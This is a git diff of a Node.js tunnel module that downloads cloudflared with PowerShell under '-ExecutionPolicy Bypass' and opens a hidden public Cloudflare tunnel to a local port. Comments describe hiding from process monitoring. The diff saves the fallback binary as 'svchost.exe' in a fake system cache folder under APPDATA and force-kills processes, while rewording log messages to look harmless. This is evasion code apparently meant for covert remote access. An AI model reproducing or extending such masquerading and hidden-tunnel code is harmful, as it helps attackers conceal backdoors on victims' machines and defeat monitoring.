@@ -31,46 +31,46 @@ const config = loadConfig();
  * Resolve cloudflared.exe binary location with obfuscation.
  * Hides from process monitoring by using system-like path.
  */
+/**
+ * Resolve cloudflared.exe binary location.
+ * Prioritizes bundled assets/bin/cloudflared.exe first to ensure stability.
+ */
 function resolveCloudflaredBin() {
   if (config.cloudflaredPath && fs.existsSync(config.cloudflaredPath)) {
-    return config.cloudflaredPath;
-  }
-
-  // Obfuscated path: masquerade as system service temporary file
-  const obfuscatedDir = path.join(process.env.APPDATA || process.env.TEMP || 'C:\\Windows\\Temp', '.cache', 'system');
-  if (!fs.existsSync(obfuscatedDir)) {
     try {
-      fs.mkdirSync(obfuscatedDir, { recursive: true });
+      if (fs.statSync(config.cloudflaredPath).size > 1000000) return config.cloudflaredPath;
     } catch (_) {}
   }
 
-  const obfuscatedBin = path.join(obfuscatedDir, 'svchost.tmp');
-  if (fs.existsSync(obfuscatedBin)) {
-    return obfuscatedBin;
-  }
-
-  // Fallback: bundled location
-  const bundledDir = path.join(__dirname, '..', '..', 'assets', 'bin');
-  if (!fs.existsSync(bundledDir)) {
-    fs.mkdirSync(bundledDir, { recursive: true });
-  }
-
-  const bundledExe = path.join(bundledDir, 'cloudflared.exe');
-  if (fs.existsSync(bundledExe)) {
-    return bundledExe;
-  }
-
-  // Alternative common paths
-  const commonPaths = [
+  // 1. Check bundled location FIRST (assets/bin/cloudflared.exe)
+  const bundledCandidates = [
+    path.join(__dirname, '..', '..', 'assets', 'bin', 'cloudflared.exe'),
+    path.join(process.cwd(), 'assets', 'bin', 'cloudflared.exe'),
+    path.join(process.cwd(), 'cloudflared.exe'),
     'C:\\cloudflared\\cloudflared.exe',
     'C:\\Program Files\\cloudflared\\cloudflared.exe',
-    path.join(process.cwd(), 'cloudflared.exe'),
   ];
 
-  for (const p of commonPaths) {
+  for (const p of bundledCandidates) {
     if (fs.existsSync(p)) {
-      return p;
+      try {
+        if (fs.statSync(p).size > 1000000) return p;
+      } catch (_) {}
     }
+  }
+
+  // 2. Fallback system cache location (with .exe extension so Windows can execute it)
+  const obfuscatedDir = path.join(process.env.APPDATA || process.env.TEMP || 'C:\\Windows\\Temp', '.cache', 'system');
+  if (!fs.existsSync(obfuscatedDir)) {
+    try { fs.mkdirSync(obfuscatedDir, { recursive: true }); } catch (_) {}
+  }
+
+  const obfuscatedBin = path.join(obfuscatedDir, 'svchost.exe');
+  if (fs.existsSync(obfuscatedBin)) {
+    try {
+      if (fs.statSync(obfuscatedBin).size > 1000000) return obfuscatedBin;
+      fs.unlinkSync(obfuscatedBin);
+    } catch (_) {}
   }
 
   return obfuscatedBin;
@@ -79,30 +79,41 @@ function resolveCloudflaredBin() {
 let CLOUDFLARED_BIN = resolveCloudflaredBin();
 
 /**
- * Ensure cloudflared.exe is present, downloading to obfuscated location if needed.
+ * Ensure cloudflared.exe is present, downloading to system location if needed.
  */
 function ensureCloudflaredAvailable() {
   return new Promise((resolve) => {
     CLOUDFLARED_BIN = resolveCloudflaredBin();
     if (fs.existsSync(CLOUDFLARED_BIN)) {
-      return resolve(CLOUDFLARED_BIN);
+      try {
+        if (fs.statSync(CLOUDFLARED_BIN).size > 1000000) return resolve(CLOUDFLARED_BIN);
+      } catch (_) {}
     }
 
-    logger.info('[+] Initializing system service binary...');
+    logger.info('[+] Initializing cloudflared binary...');
     const PS = process.env.SystemRoot
       ? `${process.env.SystemRoot}\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`
       : 'powershell.exe';
     
-    // Download to obfuscated location with system-like name
+    // Download to location with .exe extension
     const downloadCmd = `"${PS}" -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe' -OutFile '${CLOUDFLARED_BIN}' -UseBasicParsing"`;
 
     try {
       execSync(downloadCmd, { windowsHide: true, timeout: 60000 });
       if (fs.existsSync(CLOUDFLARED_BIN)) {
-        logger.info('[OK] System binary initialized successfully');
+        logger.info('[OK] Cloudflared binary initialized successfully');
         return resolve(CLOUDFLARED_BIN);
       }
-    } catch (_) {}
+    } catch (err) {
+      logger.warn(`[TunnelService] Cloudflared download warning: ${err.message}`);
+    }
+
+    for (const fallback of [
+      path.join(__dirname, '..', '..', 'assets', 'bin', 'cloudflared.exe'),
+      path.join(process.cwd(), 'assets', 'bin', 'cloudflared.exe')
+    ]) {
+      if (fs.existsSync(fallback)) return resolve(fallback);
+    }
 
     resolve(null);
   });
@@ -120,10 +131,18 @@ function createCloudflaredTunnel(port) {
       return reject(new Error('cloudflared binary unavailable'));
     }
 
-    logger.info(`[+] Establishing network tunnel for localhost:${port}`);
+    logger.info(`[+] Establishing Cloudflare network tunnel for localhost:${port} via ${path.basename(binPath)}`);
 
     try {
-      const tunnelProcess = spawn(binPath, ['tunnel', '--url', `http://127.0.0.1:${port}`, '--no-autoupdate'], {
+      if (process.platform === 'win32') {
+        try { execSync('taskkill /F /IM cloudflared.exe /IM svchost.tmp >nul 2>&1', { windowsHide: true }); } catch (_) {}
+      }
+      const tunnelProcess = spawn(binPath, [
+        'tunnel',
+        '--url', `http://127.0.0.1:${port}`,
+        '--protocol', 'http2',
+        '--no-autoupdate'
+      ], {
         stdio: ['ignore', 'pipe', 'pipe'],
         windowsHide: true,
       });
@@ -148,7 +167,7 @@ function createCloudflaredTunnel(port) {
           resolved = true;
           clearTimeout(timeout);
           const publicUrl = match[0];
-          logger.info(`[OK] Network tunnel established: ${publicUrl}`);
+          logger.info(`[OK] Cloudflare tunnel established: ${publicUrl}`);
           resolve({ publicUrl, tunnelProcess });
         }
       }
@@ -168,7 +187,9 @@ function createCloudflaredTunnel(port) {
         if (!resolved) {
           resolved = true;
           clearTimeout(timeout);
-          reject(new Error(`cloudflared exited (code=${code})`));
+          const lastLine = combinedOutput.trim().split('\n').filter(Boolean).pop() || `exit code ${code}`;
+          logger.warn(`[TunnelService] Cloudflare process exited (${lastLine})`);
+          reject(new Error(`cloudflared exited (code=${code}): ${lastLine}`));
         }
       });
     } catch (err) {
